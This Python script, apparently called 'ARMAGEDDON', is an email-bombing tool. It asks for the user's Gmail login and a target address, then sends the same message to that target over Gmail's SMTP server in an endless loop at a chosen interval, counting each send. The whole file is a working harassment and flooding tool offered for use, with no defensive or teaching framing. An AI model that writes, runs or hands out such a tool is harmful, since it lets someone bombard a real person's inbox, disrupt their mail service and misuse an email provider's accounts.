import sys
import os
import pyfiglet
import smtplib
import time
import getpass
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


CRED = '\033[91m'
CEND = '\033[0m'


ascii_banner = pyfiglet.figlet_format("ARMAGEDDON")
print(CRED + ascii_banner + CEND)


sentnum = 0
timesec = input('Please enter seconds at which the voleys will be sent: ')
x = int(timesec)
print ('\nNOTE: You can use CTRL + C to stop the script at any given time.')
print ('\nPlease wait...')
time.sleep(5)

email_user = input('\nEnter your gmail username (user@gmail.com): ')
email_password = input('\nEnter your gmail password: ')
email_send = str(input('\nPlease enter target email: '))
sub = input('\nEnter your email subject: ')
bod = input('\nEnter your email text: ')
print ('\n \n')
print ('Executing script in 10 seconds. Script developed by Nikola Arbov.')
time.sleep(10)


def sender():
 subject = sub
 msg = MIMEMultipart()
 msg['From'] = email_user
 msg['To'] = email_send
 msg['Subject'] = subject

 body = bod
 msg.attach(MIMEText(body,'plain'))

 part = MIMEBase('application','octet-stream')
 


 
 text = msg.as_string()
 server = smtplib.SMTP('smtp.gmail.com',587)
 server.starttls()
 server.login(email_user,email_password)


 server.sendmail(email_user,email_send,text)
 server.quit()

try:
 while True: 
  sender()
  sentnum += 1
  print ('\nSending emails to ' + CRED + str(email_send) + CEND + ' at the rate of ' + str(x) + ' seconds per send. \nThis email is number ' + str(sentnum) + '.')
  time.sleep(x)
except KeyboardInterrupt:
 print ('Script Stopped.Thank you for using ' +  '\x1b[6;30;42m' + 'ARMAGEDDON' + '\x1b[0m' + ' !')
